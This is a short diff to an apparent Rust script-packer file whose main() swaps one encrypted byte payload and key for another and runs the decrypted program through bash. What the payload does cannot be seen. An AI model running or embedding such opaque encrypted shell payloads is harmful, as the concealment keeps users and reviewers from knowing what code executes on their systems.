@@ -77,8 +77,8 @@ fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
 }
 
 fn main() {
-    let prog = vec![125, 79, 161, 23, 63, 59, 129, 87, 132, 46, 93, 67, 61, 50, 43, 19, 19, 170, 31, 169, 185, 124, 132, 47, 127, 233, 11, 40, 202, 168, 19, 157, 237, 184, 83, 109, 170, 190, 155, 55, 214, 229, 203, 14, 38, 242, 8, 232, 182, 122, 123, 142, 140, 11, 49, 23, 31, 242, 45, 173, 213, 101, 95, 71, 135, 12, 163, 242, 105, 16, 66, 47, 117, 247, 80, 237, 228, 119, 152, 200, 167];
-    let rand_key = "ESyfPw24Ou2wwfykOIZB3Oo3t1mjHQfYsNFm1RdONbQy9m2PijAgX21nngl4grxN65C2yWyCt05PIy9BRiSDn8zgmArJ6OAfoIFAFYKEFuaTQza28FoE26q1ZXAyVooV";
+    let prog = vec![1, 215, 63, 244, 36, 3, 84, 213, 177, 20, 149, 117, 1, 157, 78, 213, 231, 45, 245, 105, 220, 189, 224, 110, 178, 227, 114, 18, 250, 187, 212, 15, 252, 138, 201, 46, 203, 77, 73, 194, 92, 232, 77, 98, 196, 160, 35, 53, 137, 1, 56, 27, 229, 166, 165, 255, 246, 37, 145, 126, 92, 45, 10, 169, 78, 236, 136, 130, 131, 41, 22, 23, 52, 66, 219, 56, 110, 60, 7, 191, 117];
+    let rand_key = "6e5kW6lzAcoqn7SgfaT6pgBQWZa8MRuGQNB0b3bFwzFt6wWQoEmymiYsiauY7VBI5uzguJ8PNVSJUS2jeRer7NyQ3fDA9toGKARXTEQvSFYNnQLYtIJ9rCIW2fNLHafU";
     let pass = "";
     let iterp = "bash";
 
